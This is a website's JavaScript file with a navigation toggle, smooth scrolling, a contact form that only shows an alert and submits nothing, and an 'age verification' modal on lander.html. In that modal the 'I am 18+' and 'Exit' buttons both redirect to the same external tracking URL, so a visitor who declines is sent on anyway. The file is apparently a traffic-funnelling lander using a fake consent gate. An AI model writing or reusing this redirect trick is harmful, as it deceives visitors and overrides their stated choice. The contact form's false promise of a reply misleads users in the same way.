const navToggle=document.querySelector('[data-nav-toggle]');
const navMenu=document.querySelector('[data-nav-menu]');
if(navToggle&&navMenu){
  navToggle.addEventListener('click',()=>{
    navMenu.classList.toggle('open');
    if(navMenu.classList.contains('open')){
      navMenu.style.display='flex';
    }else{
      navMenu.style.display='';
    }
  });
}

document.querySelectorAll('a[href^="#"]').forEach(a=>{
  a.addEventListener('click',e=>{
    const href=a.getAttribute('href');
    if(href&&href.startsWith('#')){
      const el=document.querySelector(href);
      if(el){
        e.preventDefault();
        el.scrollIntoView({behavior:'smooth',block:'start'});
      }
    }
  });
});

const form=document.querySelector('#contact-form');
if(form){
  form.addEventListener('submit',e=>{
    e.preventDefault();
    const data=Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name||'there'}! We'll reply to ${data.email||'your inbox'} soon.`);
    form.reset();
  });
}

(function ageGate() {
  // Only run this on the lander.html page
  if (!window.location.pathname.endsWith('lander.html')) {
    return;
  }

  // If the user has already verified their age in this session, do nothing
  if (sessionStorage.getItem('ageVerified') === 'true') {
    return;
  }

  // Create the modal elements
  const modalBackdrop = document.createElement('div');
  modalBackdrop.className = 'modal-backdrop';
  modalBackdrop.innerHTML = `
    <div class="modal">
      <h3>Age Verification</h3>
      <p>Please confirm you are 18 years of age or older to continue.</p>
      <div style="display:flex; gap:10px; margin-top: 16px;">
        <button class="btn" id="age-confirm-yes">I am 18+</button>
        <button class="btn ghost" id="age-confirm-no">Exit</button>
      </div>
    </div>
  `;

  // Add the modal to the page and display it
  document.body.appendChild(modalBackdrop);
  modalBackdrop.style.display = 'flex';

  // Handle button clicks
  document.getElementById('age-confirm-yes').addEventListener('click', () => {
    window.location.href = 'https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]';
  });

  document.getElementById('age-confirm-no').addEventListener('click', () => {
    window.location.href = 'https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]';
  });
})();

